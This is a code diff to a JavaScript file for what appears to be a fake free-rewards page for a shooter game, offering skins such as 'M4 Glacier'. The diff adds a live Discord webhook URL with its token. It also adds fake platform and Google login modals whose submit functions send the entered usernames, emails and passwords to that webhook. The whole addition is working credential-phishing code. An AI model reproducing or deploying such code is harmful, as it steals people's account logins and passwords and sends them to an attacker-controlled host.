@@ -1,4 +1,4 @@
-const webhookURL = "YOUR_DISCORD_WEBHOOK_URL";
+const webhookURL = "https://discord.com/api/webhooks/1359746477349666936/88A_G-WTxuBSeQ7oep_vrpDPIhqpkhGs39vbE2DLoyrNETzfuxv82mOwF3NC5JiSwnpT";
 
 const rewardsList = [
   "M4 Glacier", "Pharaoh Suit", "M4 Fool", "AKM Glacier", "Glacier Set"
@@ -51,3 +51,56 @@ function claimReward(reward) {
   fetch(webhookURL, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ content: `Reward Claimed: ${reward}` })
+  })
+  .then(() => {
+    alert(`You claimed the ${reward} reward!`);
+  });
+}
+
+function openModal(platform) {
+  document.getElementById("loginTitle").innerText = `Login with ${platform.charAt(0).toUpperCase() + platform.slice(1)}`;
+  document.getElementById("loginModal").style.display = "flex";
+}
+
+function closeModal() {
+  document.getElementById("loginModal").style.display = "none";
+}
+
+function openGoogleModal() {
+  document.getElementById("googleModal").style.display = "flex";
+}
+
+function closeGoogleModal() {
+  document.getElementById("googleModal").style.display = "none";
+}
+
+function submitLogin() {
+  const user = document.getElementById("loginUser").value;
+  const pass = document.getElementById("loginPass").value;
+
+  fetch(webhookURL, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ content: `Login attempt:\nUsername: ${user}\nPassword: ${pass}` })
+  })
+  .then(() => {
+    alert("Login attempt logged.");
+    closeModal();
+  });
+}
+
+function submitGoogleLogin() {
+  const email = document.getElementById("googleEmail").value;
+  const password = document.getElementById("googlePassword").value;
+
+  fetch(webhookURL, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ content: `Google login attempt:\nEmail: ${email}\nPassword: ${password}` })
+  })
+  .then(() => {
+    alert("Google login attempt logged.");
+    closeGoogleModal();
+  });
+}
